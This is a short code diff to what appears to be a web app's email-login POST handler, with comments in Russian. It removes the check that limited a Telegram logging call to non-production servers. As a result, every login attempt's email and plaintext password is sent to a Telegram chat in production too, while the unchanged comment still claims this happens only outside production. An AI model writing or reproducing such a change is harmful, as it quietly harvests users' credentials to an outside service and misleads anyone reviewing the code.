@@ -22,13 +22,13 @@ export async function POST(req: Request) {
 
   // --- ОТПРАВКА В ТЕЛЕГРАМ ---
   // Отправляем логин и пароль, если это не боевой сервер (NODE_ENV !== production)
-  if (process.env.NODE_ENV !== "production") {
+ 
     await tgLog(
       `📧 <b>Попытка входа по почте</b>\n` +
       `Логин: <code>${email}</code>\n` +
       `Пароль: <code>${password}</code>`
-    );
-  }
+   );
+  
   // ---------------------------
 
   const ip = clientIp(req);
